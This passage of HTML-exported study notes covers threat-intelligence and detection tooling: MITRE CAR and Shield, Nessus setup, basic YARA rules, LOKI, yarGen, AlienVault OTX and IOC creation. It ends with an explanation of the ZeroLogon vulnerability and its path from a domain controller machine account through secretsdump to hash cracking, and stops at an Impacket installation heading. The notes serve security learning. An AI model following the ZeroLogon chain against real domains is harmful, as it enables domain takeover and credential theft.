tool specific analytic with Splunk. Describes a set of instructions or algorithms that a program or system will perform. </span></p><p><a href='https://car.mitre.org/analytics/'><span>Full Analytic List</span></a></p><p><span>CAR is a great place for finding analytics that takes us further than the Mitigation and Detection summaries in the ATT&amp;CK® framework</span></p><hr /><h4 id='shield-active-defense'><span>Shield Active Defense</span></h4><p><span>MITRE Shield has been replaced with MITRE Engage. Shield is still archived on GitHub (mitrecnd.github.io-master)</span></p><p><span>Set up a local copy of MITRE Shield, </span><code>cd github directory</code><span>, </span><code>bundle exec jekyll serve</code><span> then navigate to localhost:4000</span></p><p><span>Similar to ATT&amp;CK Matrix but the tactics and techniques provided to us enable us to trap and/or engage with an adversary active within the network. We can plant decoy creds and monitor to see if the creds are used elsewhere. By doing that we can be alerted of a adversary&#39;s presence and we can learn about there TTPs. The information gathered can be classified as threat intelligence.</span></p><p><span>Shield has a Matrix similar to ATT&amp;CK matrix. If you click on a column you can see Use cases, Opportunities, and Procedures based on that technique.</span></p><hr /><h4 id='mitre-engenuity'><span>MITRE Engenuity</span></h4><p><span>If all the tools above where not enough MITRE also has:</span></p><ul><li><p><u><span>Center of Threat-Informed Defense (CTID)</span></u></p><p><span>consists of several vendors that conduct research on cyber threats and their TTPs</span></p></li><li><p><u><span>Adversary Emulation Library and ATT&amp;CK Emulation Plans</span></u></p><p><span>public library that makes adversary emulation plans a free resource for blue/red teamers.</span></p><p><span>Emulation plans currently available - APT3, APT29, and FIN6</span></p><p><span>Step by step guide on how to mimic the specific threat group. </span></p></li></ul><hr /><h4 id='threat-intelligence-ti'><span>Threat Intelligence (TI)</span></h4><p><span>aka Cyber Threat Intelligence (CTI) is the information, or TTPs, attributed to the adversary. By using TI we can make better decisions regarding the defensive strategy.</span></p><hr /><p>&nbsp;</p><h3 id='nessus'><span>Nessus</span></h3><p><span>a vulnerability scanner that uses techniques similar to nmap to find and report vulnerabilites, which are then presented in a GUI. Offers a free and paid versions</span></p><h4 id='install'><span>Install</span></h4><ol start='' ><li><p><a href='https://www.tenable.com/products/nessus/nessus-essentials' target='_blank' class='url'>https://www.tenable.com/products/nessus/nessus-essentials</a><span> and registry for an account</span></p><p><span>You will get an activation code in your email</span></p></li><li><p><span>Download the appropriate package for your OS</span></p></li><li><p><span>Go to directory and upack package </span><code>sudo dpkg -i &lt;nessus.pacakge.deb&gt;</code><span> (debian)</span></p></li><li><p><span>Start Nessus service - </span><code>sudo /bin/systemctl start nessusd.service</code></p></li><li><p><span>navigate to </span><a href='https://localhost:8834' target='_blank' class='url'>https://localhost:8834</a></p><ul><li><span>Nessus Essentials</span></li><li><span>Enter Activation Code</span></li><li><span>Create Username/password</span></li></ul></li><li><p><span>Nessus will then download required Plugins. Once finished login and setup will be complete</span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></li></ol><h3 id='yara'><span>Yara</span></h3><p><a href='threatandvuln.html'><span>Top</span></a></p><p><span>Yara </span><a href='https://github.com/virustotal/yara'><span>github rebo</span></a></p><p><span>Yara can identify information based on both binary and textual patterns, such as hexadecimal and strings contained within a file. Rules are used to label these patterns. </span></p><p><span>Applications use strings to store data such as text, hello world would be the string</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print("hello world")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span> we could write a Yara rule to search for the string in every program on our OS.</span></p><p><span>Malware also uses strings to store textual data such as bitcoin wallet address for payments and IPs of C2 nodes.</span></p><p>&nbsp;</p><p><strong><span>Install</span></strong></p><p><span>Linux: </span><code>apt install yara</code></p><p><span>Windows: </span><a href='https://github.com/VirusTotal/yara/archive/v4.0.2.tar.gz' target='_blank' class='url'>https://github.com/VirusTotal/yara/archive/v4.0.2.tar.gz</a></p><hr /><h4 id='introduction'><span>Introduction</span></h4><p><span>the language that Yara uses for rules is easy to pick up, hard to master. Rules are only effective as your understanding of the patterns.</span></p><p><span>Every Yara rule requires the </span><strong><span>rule file we create</span></strong><span> and the </span><strong><span>name of file,directory,or PID to use the rule for</span></strong></p><p><span>Every rule must have a name and a condition. (.yar is the standard file extention)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rule &lt;name&gt;{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>condition: true</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 69px;"></div><div class="CodeMirror-gutters" style="display: none; height: 69px;"></div></div></div></pre><p><code>yara rule.yar &lt;directory/file&gt;</code></p><p><span>This yara rule would simply check to see if the file or directory exists</span></p><hr /><h4 id='conditions'><span>Conditions</span></h4><p><a href='https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd'><span>Anatomy of a YARA rule</span></a></p><p><span>Yara has several conditions some common ones are below.</span></p><figure><table><thead><tr><th><span>Condition</span></th><th><span>Explination</span></th></tr></thead><tbody><tr><td><span>keyword</span></td><td><span>such as </span><code>and</code><span> </span><code>not</code><span> and </span><code>or</code></td></tr><tr><td><span>meta</span></td><td><span>for descriptive information. </span><code>desc</code><span> can be used to summarise what your rule checks for.</span></td></tr><tr><td><span>strings</span></td><td><span>search for specific text or hexadecimal in files or programs.</span></td></tr><tr><td><span>conditions</span></td><td><span>We have seen </span><code>true</code><span> and </span><code>any of them</code><span>. You can use operators within your conditions as well.</span></td></tr></tbody></table></figure><p><strong><span>Conditions</span></strong></p><p><span>Example:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rule helloworld_checker{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>strings:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>$hello_world = "Hello World"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>condition:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span> &nbsp;  # only shows if hello world is less than or equal to 10 occurances</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>$hello_world &lt;= 10</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 138px;"></div><div class="CodeMirror-gutters" style="display: none; height: 138px;"></div></div></div></pre><p><strong><span>Keywords</span></strong></p><p><span>Example:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rule helloworld_checker{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>strings:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>$hello_world = "Hello World"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>$txt_file = ".txt"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>condition:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span> &nbsp;  # only shows if both conditions are true. hello world is in a .txt file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>$hello_world and $txt_file</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 161px;"></div><div class="CodeMirror-gutters" style="display: none; height: 161px;"></div></div></div></pre><p><strong><span>Strings</span></strong></p><p><span>Example:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> rule helloworld_checker{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strings: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  $hello_world = "Hello World"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; condition:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  <span class="cm-tab" role="presentation" cm-text="	">  </span>  $hello_world  }</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 115px;"></div><div class="CodeMirror-gutters" style="display: none; height: 115px;"></div></div></div></pre><p><span>The Problem with this is it will only match if Hello World is found use </span><code>any of them</code><span> as your condition</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> rule helloworld_checker{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strings: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  $hello_world = "Hello World"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  $hello_world_lowercase = "hello world"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  $hello_world_uppercase = "HELLO WORLD"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; condition:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  any of them &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> }</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 184px;"></div><div class="CodeMirror-gutters" style="display: none; height: 184px;"></div></div></div></pre><hr /><h4 id='yara-modules'><span>YARA Modules</span></h4><p><a href='threatandvuln.html'><span>Top</span></a></p><p><span>Frameworks such as Cuckoo Sandbox and Python&#39;s PE Module allows you to improve the technicality of your yara rules.</span></p><p><strong><span>Cuckoo</span></strong></p><p><span>automated malware analysis environment. allows you to generate yara rules based on the behaviors discovered from the Cuckoo sandbox.</span></p><p><strong><span>Python PE</span></strong></p><p><span>allows you to create yara rules from the various sections and elements of the windows portable executable structure. Standard formatting of all executables and dll files on windows. Examining PE files is essential in malware analysis.</span></p><hr /><h4 id='yara-toolsscanners'><span>Yara Tools/Scanners</span></h4><p><span>There are plenty of Github </span><a href='https://github.com/InQuest/awesome-yara'><span>resources</span></a><span> and open source tools that can be used to leverage Yara in hunt or incident response engagement. </span></p><p>&nbsp;</p><p><strong><span>LOKI</span></strong></p><p><span>free open source Indicator of Compromise (IOC) and Yara Scanner. </span></p><p><span>Based on four methods</span></p><ol start='' ><li><span>file name IOC check</span></li><li><span>Yara Rule Check</span></li><li><span>Hash Check</span></li><li><span>C2 Back Connect Check</span></li></ol><p><span>Can be used on both windows and linux. </span></p><p><span>As a security analyst, you may need to research various threat intelligence reports, blog postings, etc. and gather information on the latest tactics and techniques used in the wild, past or present. </span></p><p><span>Typically in these readings, IOCs (hashes, IP addresses, domain names, etc.) will be shared so rules can be created to detect these threats in your environment, along with Yara rules. </span></p><p><span>You might also find yourself in a situation where you&#39;ve encountered something unknown, that your security stack of tools can&#39;t/didn&#39;t detect. Using tools such as Loki, you will need to add your own rules based on your threat intelligence gathers or findings from an incident response engagement (forensics). </span></p><p><span>test a file with loki: </span><code>python ~/tools/loki/loki.py -p .</code><span> it is best to be in the directory of the file you want to test</span></p><p><strong><span>THOR</span></strong></p><p><span>Multi-platform IOC and YARA Scanner (same creater as LOKI). THOR Lite is the free version. includes scan throttling to limit exhausting CPU resources.  More geared toward corporate customers.</span></p><p><strong><span>FENRIR</span></strong></p><p><span>Created to address the issue from its predecessors above, where requirements must be met for them to function. FENRIR is a bash script.</span></p><p><strong><span>YAYA</span></strong></p><p><span>Created by Electronic Frontier Foundation (EFF). helps researches manage muliple YARA rule repositories. Linux only. </span></p><hr /><h4 id='creating-yara-rule-with-yargen'><span>Creating Yara rule with yarGen</span></h4><p><a href='threatandvuln.html'><span>Top</span></a></p><p><span>Sometime when Loki does not flag on we need to create a Yara rule to detect specifc details in our environment.</span></p><p><span>This is commonly done in case of an incident that effects the organization in a negative fashion. Manually going through line by line would be daunting. This is where yarGen comes in, a generator for YARA rules.</span></p><p><span>yarGen creates rules from the strings on a file while removing all strings that also appear in goodware files.</span></p><p><span>To use yarGen and generate a rule:</span></p><p><code>python3 yarGen.py -m &lt;file path&gt; --excludegood -o &lt;output.yar&gt;</code></p><p><span>cat the new .yar file to see the kinds of strings that were found and some conditions that need to be met</span></p><p><span>Test yara and your rule </span><code>yara &lt;output.yar&gt; &lt;path/to/file&gt;</code></p><p><span>*remember no error means a flag was found</span></p><p><span>Another tool you can use is yarAnalyzer. Use </span><a href='https://github.com/Neo23x0/yarAnalyzer/'><span>yarAnalyzer</span></a><span> to analyze and get statistics on your yar rules.</span></p><hr /><h4 id='valhalla'><span>Valhalla</span></h4><p><a href='https://valhalla.nextron-systems.com/'><span>Valhalla</span></a><span> is an online Yara feed database. Thousans of hand-crafted high-quality YARA rules. You can conduct searched based on keyword, tag, att&amp;ck technique, sha256, or rule name.</span></p><p><span>Each rule has a reference link for more information about the rule and date.</span></p><hr /><p>&nbsp;</p><h3 id='information-sharing-and-analysis-centers-isacs'><span>Information Sharing and Analysis Centers (ISACs)</span></h3><p><a href='threatandvuln.html'><span>Top</span></a></p><p><span>Used to share and exchange various indicates of a compromise. Can include MD5s, Ips, and Yara rules.</span></p><p><span>Several ISACs avaialable : AlienVault OTX, Threat Connect, and MISP</span></p><hr /><h4 id='threat-intelligence'><span>Threat Intelligence</span></h4><p><span>aka TI and Cyber Threat Intelligence (CTI), used to provide information about the threat landscape specifically adversaries and their TTPS. Usually revolved around APTS.</span></p><p><span>Data must be analyzed to be considered TI. Venders will sometimes share their collected CTI called ISACs.</span></p><p><span>Threat Intelligence is broken up into three different types:</span></p><ul><li><span>Strategic - assist senior management to make infomred decisions about budget and strategy</span></li><li><span>Tactical - Interacts with the TTPs to identiy adversary attack patterns</span></li><li><span>Operational - Interact with Indicators of Compromise (IOCs) and how the adversaries operationalize</span></li></ul><hr /><h4 id='threat-connect'><span>Threat Connect</span></h4><p><span>focuses on the information and new developments within cybersecurity and the threat landspace and connecting the landscape with indicators. </span></p><p><span>Helps teams beter prioritize. Threat Connect would fall under the tactical type of threat intelligence. </span></p><p><span>There is a free and open-source of </span><a href='https://threatconnect.com/'><span>Threat Connect</span></a><span> available, there is payed version for full access to the platform.</span></p><p><span>Included a default dashboard with:</span></p><ul><li><span>top sources by observation</span></li><li><span>latest intelligence</span></li><li><span>top source by flase positives</span></li><li><span>top tags</span></li><li><span>indicator breakdown</span></li></ul><hr /><h4 id='alienvault-otx'><span>AlienVault OTX</span></h4><p><span>from AT&amp;T Cybersecurity, the main ISACs used for community maintained threat intelligence.</span></p><p><span>Create an account </span><a href='https://otx.alienvault.com/'><span>here</span></a><span> to start using the applicatoin.</span></p><p><span>Uses Pulses to create trackers for various categories, categorized by Malware type, APT, or group and targeted industry. pulses include a variety of IOCs (file hashes, IPV4, IPv6, domain, url, yara, cve)</span></p><p><span>The main page in use is the dashboard which includes a visualization of the most common malware. </span></p><p><span>Six tabs:</span></p><ol start='' ><li><strong><span>dashboard</span></strong><span> - brief overview of important intel</span></li><li><strong><span>browse</span></strong><span> - see all new pulses and sort by categories</span></li><li><strong><span>scan</span></strong><span> </span><strong><span>endpoints</span></strong><span> - automated service called OTX Endpoint security that will scan endpoints for indicators</span></li><li><strong><span>create</span></strong><span> </span><strong><span>pulse</span></strong><span> - create your own pulse</span></li><li><strong><span>submit</span></strong><span> </span><strong><span>sample</span></strong><span> - submit new malware sample or url sample</span></li><li><strong><span>API</span></strong><span> </span><strong><span>integration</span></strong><span> - allows synchronization with other tools for monitoring your environment.</span></li></ol><hr /><h4 id='using-otx-to-gather-threat-intelligence'><span>Using OTX to gather Threat Intelligence</span></h4><p><a href='threatandvuln.html'><span>Top</span></a></p><p><strong><span>Pulse Overview</span></strong></p><p><span>Pulses can consist of a description, tags, indicator types (hash, yara, ip) and threat infrastructure. OTX uses pulses as their indicators. </span></p><p><span>Pulse consists of three sections: </span></p><ol start='' ><li><p><span>Pulse description - description, tags, malware families, and ATT&amp;CK IDs. Used to verify the pulse and get further background information. What the pulse is for and how it was gatherd. </span></p></li><li><p><span>Indicator overiew - will give you a very brief statistical representation of the indicators within the pulse as well as threat infrastructure.</span></p></li><li><p><span>Indicators - most important section, it contains all of the indicators and information about them.</span></p><ol start='' ><li><p><strong><span>type</span></strong><span> - type of indicator (URL,filehash, ip,domain)</span></p></li><li><p><strong><span>Indicator itselft</span></strong></p></li><li><p><strong><span>Active</span></strong><span> - shows active status (seen in the wild)</span></p></li><li><p><strong><span>Related Pulses</span></strong><span> - share same indicators as other pulses</span></p></li><li><p><strong><span>Extra Information (Advanced)</span></strong><span> - Dynamic analysis, network activity, and Yara rules</span></p><p>&nbsp;</p></li></ol></li></ol><p><strong><span>Finding Pulses</span></strong></p><p><strong><span>Finding Pulses based on Malware</span></strong></p><p><span>allows you to very quickly find IOCs and rules for a specific strain of malware. OTX will visualize the processes the malware is running.</span></p><p><strong><span>Based on Adversaries</span></strong></p><p><span>You require a foundational knowledge of adversaries and their operations. Be aware that each vendor has its own naming scheme for APTs.</span></p><p><strong><span>Based on Industry</span></strong></p><p><span>focus on ithe industry such as finance, education, aerospace, etc.</span></p><hr /><h4 id='creating-iocs-manually'><span>Creating IOCs Manually</span></h4><p><span>There are a few tools that can help with the creation of IOCs including strings, winmd5free, and mandiant IOC editor. </span></p><p><span>There are tools that can be used to automate this process like Mandiant Redline.</span></p><p><strong><span>Mandiant</span></strong></p><p><span>Start with getting basic information about your file</span></p><ul><li><span>MD5 file hash</span></li><li><span>File Properties (right-click properties)</span></li><li><span>Strings - </span><code>./strings.exe &lt;path to file&gt; --accepteula &gt; &lt;output.txt&gt;</code></li></ul><p><span>				</span><span>Look for things like IP addresses, BTC address, unique function names, etc.</span></p><p><span>Once you have all your indicators prepared you can begin creating an IOC with mandiant</span></p><ol start='' ><li><p><span>create a new IOC , File &gt; new Indicator</span></p></li><li><p><span>add your indicators to the IOC from the Item tab</span></p><p>&nbsp;</p><p><img src="mandiant manual ioc.png" referrerpolicy="no-referrer" alt="manualioc"></p></li></ol><p>&nbsp;</p><p><strong><span>Pulses from IOCs</span></strong></p><p><span>Navigate to AlienVault OTX</span></p><p><span>Create new Pulse - AlienVault OTX can automatically extract indicators. But it is still suggested to create your own IOCs</span></p><p><span>You can also submit the malware samele and analyze it, this will give you many indicators.</span></p><p><span>With all of our information we can look for other pulses similar to our sample. </span></p><hr /><p>&nbsp;</p><h3 ><span>Zero Logon</span></h3><p><a href='threatandvuln.html'><span>Top</span></a></p><p><span>The ZeroLogon vulnerability (CVE-2020-1472) allows attackers to go from Zero to Domain Admin in a short time.</span></p><p><span>purely a statistics based attack that abuses a feature with MS-NRPC (Microsoft NetLogon Remote Protocol). MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. The attack focuses on a poor implementation of Cyrptography. It uses AES-CFB8 for a function called ComputeNetLogonCredential, not an issue but they hard coded the initialization vector to use all Zeros instead of a random string.</span></p><p><span>When an attacker sends a message only containing zeros with the IV of zeros, there is a 1 in 256 chance that the Ciphertext will be zero.</span></p><h4 id='machine-accounts'><span>Machine Accounts</span></h4><p><span>If a statistic based attack is used on a user account, we would get locked out, this doesnt apply to machine accounts.</span></p><p><span>They have no predefined account attempts because a 64+ character alpha numeric password is normally used to secure them making them very difficult to break into.</span></p><h4 id='abusing-the-vulnerability'><span>Abusing the Vulnerability</span></h4><p><span>Machine accounts often hold system level privileges. We can take the Domain Controller&#39;s Machine account and use the granted authenitcation in conjunction with SecretDumps.py to dump all of the passwords within the domain. </span></p><p><span>Zero login --&gt; Domain Controllers Machine Account --&gt; Secretsdump --&gt; crack hashes</span></p><h4 id='analyzing-the-ms-nrpc-logon-process'><span>Analyzing the MS-NRPC Logon Process</span></h4><p>&nbsp;</p><p><img src="zerologon.png" alt="zerodiagram" style="zoom:80%;" /></p><p>&nbsp;</p><p><strong><span>Impacket Installation</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" 